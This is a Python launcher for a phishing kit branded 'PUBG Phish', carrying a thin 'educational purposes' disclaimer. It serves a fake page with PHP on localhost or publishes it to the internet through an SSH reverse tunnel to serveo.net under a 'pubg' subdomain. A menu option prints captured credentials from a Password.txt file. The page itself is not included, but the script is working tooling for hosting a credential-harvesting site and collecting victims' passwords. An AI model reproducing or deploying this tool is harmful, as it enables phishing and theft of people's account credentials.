#!/usr/bin/python3

import os

os.system("clear")

Blue = "\033[1;34m"
Yellow = "\033[1;33m"
Red = "\033[1;31m"
Reset = "\033[0m"


def banner():
	print(f"{Yellow} (                       (       ) (   (       )  {Reset}")
	print(f"{Yellow} )\ )        (  (        )\ ) ( /( )\ ))\ ) ( /(  {Reset}")
	print(f"{Yellow}(()/(   (  ( )\ )\ )    (()/( )\()|()/(()/( )\()) {Reset}")
	print(f"{Yellow} /(_))  )\ )((_|()/(     /(_)|(_)\ /(_))(_)|(_)\  {Reset}")
	print(f"{Yellow}(_)) _ ((_|(_)_ /(_))_  (_))  _((_|_))(_))  _((_) {Reset}")
	print(f"{Blue}| _ \ | | || _ |_)) __| | _ \| || |_ _/ __|| || | {Reset}")
	print(f"{Blue}|  _/ |_| || _ \ | (_ | |  _/| __ || |\__ \| __ | {Reset}")
	print(f"{Blue}|_|  \___/ |___/  \___| |_|  |_||_|___|___/|_||_| {Reset}")
	print("")
	print(f"	{Red}[!] Code By :- {Yellow}Dhruv Lohar{Reset}")
	print(f"	{Red}[!] Only For Educational Purposes!{Reset}")
	print(f"	{Red}[!] More At : {Yellow}https://github.com/DhruvLohar{Reset}")
	print("")


def local():
	port = input(f"{Blue}Enter a port : {Reset}")
	print(f"{Blue}Running Server locally..{Reset}")
	print(f"{Blue}Link : localhost:{port}/test.html{Reset}")
	os.system(f"php -S localhost:{port}")


def over_wan():
	port = input(f"{Blue}Enter a port : {Reset}")
	print(f"{Blue}Running server over Internet...{Reset}")
	print(f"Link : https://pubg.serveo.net/test.html")

	os.system(f"nohup php -S localhost:{port} -t core/ > php.log 2>&1 &")
	os.system(f"nohup ssh -R pubg:80:localhost:{port} serveo.net > ssh.log 2>&1 &")

	option = input("Kill Process[Y/N] : ")
	if option == "Y" or option == "y":
		os.system("pkill php && pkill ssh && rm php.log ssh.log")
	else:
		pass


def see_pass():
	os.chdir("core/")
	os.system("cat Password.txt")


def start():
	banner()

	print(f"{Red}[1] Run Server Over Localhost{Reset}")
	print(f"{Red}[2] Run Server Over Internet{Reset}")
	print(f"{Red}[3] See Passwords{Reset}")
	print(f"{Red}[4] Exit{Reset}")

	option = input(f"{Red}Select[1/2/3/4] : {Reset}")

	if option == "1":
		local()
	elif option == "2":
		over_wan()
	elif option == "3":
		see_pass()
	elif option == "4":
		print(f"{Yellow}Exiting...{Reset}")
		exit()
	else:
		pass


if __name__ == '__main__':
	start()
